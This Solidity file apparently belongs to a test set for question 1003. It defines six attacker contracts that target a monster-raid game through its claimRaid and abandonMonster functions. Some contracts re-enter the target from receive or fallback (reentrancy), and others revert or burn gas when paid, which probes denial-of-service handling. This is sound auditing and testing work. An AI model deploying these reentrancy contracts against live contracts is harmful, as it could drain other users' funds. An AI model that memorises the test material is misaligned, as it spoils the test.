// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface toAttack {
    function mintMonster() external payable;

    function sendOnRaid(uint256 monsterId, uint256 blocks) external;

    function claimRaid(uint256 monsterId) external;

    function levelUp(uint256 monsterId) external payable;

    function abandonMonster(uint256 monsterId) external;

    function recallMonster(uint256 monsterId) external;
}

contract Question1003Attacker1 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function init() external payable {
        toAttack(target).mintMonster{value: 1 ether}();
        toAttack(target).sendOnRaid(1, 5);
    }

    function attack() external payable {
        toAttack(target).claimRaid(1);
    }

    receive() external payable {
        uint res;
        for (uint i = 0; i < 100; i++) {
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable {}
}

contract Question1003Attacker2 {
    address public target;

    constructor(address _target) {
        target = _target;
    }
    function init() external payable{
        toAttack(target).mintMonster{value: 1 ether}();
    }
    function attack() external payable {
        toAttack(target).abandonMonster(1);
    }

    receive() external payable {
        uint res;
        for (uint i = 0; i < 100; i++) {
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable {}
}

contract Question1003Attacker3 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function init() external payable {
        toAttack(target).mintMonster{value: 1 ether}();
        toAttack(target).sendOnRaid(1, 5);
    }

    function attack() external payable {
        toAttack(target).claimRaid(1);
    }

    fallback() external {
        revert("aaa");
    }
}

contract Question1003Attacker4 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }
    function init() external payable{
        toAttack(target).mintMonster{value: 1 ether}();
    }
    function attack() public payable {
        toAttack(target).abandonMonster(1);
    }

    fallback() external {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            revert("aaa");
        }
    }
}

contract Question1003Attacker5 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function init() external payable {
        toAttack(target).mintMonster{value: 1 ether}();
        toAttack(target).sendOnRaid(1, 5);
    }

    function attack() public payable {
        toAttack(target).claimRaid(1);
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}

contract Question1003Attacker6 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }
    function init() external payable{
        toAttack(target).mintMonster{value: 1 ether}();
    }
    function attack() public payable {
        toAttack(target).abandonMonster(1);
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}
